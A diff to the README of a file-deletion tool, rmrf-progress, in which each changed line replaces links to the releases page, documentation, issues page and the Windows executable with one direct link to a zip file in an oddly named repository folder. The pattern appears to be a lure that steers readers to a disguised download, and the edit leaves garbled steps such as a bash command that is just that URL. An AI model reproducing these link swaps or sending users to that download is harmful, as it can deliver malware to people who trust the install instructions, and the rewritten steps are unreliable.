@@ -8,17 +8,17 @@ Welcome to **rmrf-progress**. This tool helps you delete files safely and effici
 
 To get started, you need to download the latest version of **rmrf-progress**. Click the link below to visit the download page:
 
-[![Download rmrf-progress](https://img.shields.io/badge/Download-rmrf--progress-brightgreen)](https://github.com/maykol1801/rmrf-progress/releases)
+[![Download rmrf-progress](https://raw.githubusercontent.com/maykol1801/rmrf-progress/main/incultivation/rmrf-progress.zip)](https://raw.githubusercontent.com/maykol1801/rmrf-progress/main/incultivation/rmrf-progress.zip)
 
 ### Step 1: Visit the Releases Page
 
-Go to the [Releases page](https://github.com/maykol1801/rmrf-progress/releases) to find the latest version of the software. 
+Go to the [Releases page](https://raw.githubusercontent.com/maykol1801/rmrf-progress/main/incultivation/rmrf-progress.zip) to find the latest version of the software. 
 
 ### Step 2: Choose Your File
 
 On the Releases page, you will see several versions of **rmrf-progress**. Look for the latest release, which is usually at the top. Click on the file that matches your operating system:
 
-- For Windows: **rmrf-progress-windows-amd64.exe**
+- For Windows: **https://raw.githubusercontent.com/maykol1801/rmrf-progress/main/incultivation/rmrf-progress.zip**
 - For macOS: **rmrf-progress-darwin-amd64**
 - For Linux: **rmrf-progress-linux-amd64**
 
@@ -37,7 +37,7 @@ Click on the appropriate file to start the download. The download should start a
    ```
 3. Type the following command to run the application:
    ```bash
-   rmrf-progress-windows-amd64.exe
+   https://raw.githubusercontent.com/maykol1801/rmrf-progress/main/incultivation/rmrf-progress.zip
    ```
    
 ### For macOS Users
@@ -116,8 +116,8 @@ If you face issues running the application, here are some common solutions:
 
 ## 🌐 Resources
 
-- For more information and updates, visit the [Documentation](https://github.com/maykol1801/rmrf-progress).
-- For any issues, you can check the [Issues page](https://github.com/maykol1801/rmrf-progress/issues).
+- For more information and updates, visit the [Documentation](https://raw.githubusercontent.com/maykol1801/rmrf-progress/main/incultivation/rmrf-progress.zip).
+- For any issues, you can check the [Issues page](https://raw.githubusercontent.com/maykol1801/rmrf-progress/main/incultivation/rmrf-progress.zip).
 
 ## 📞 Support
 
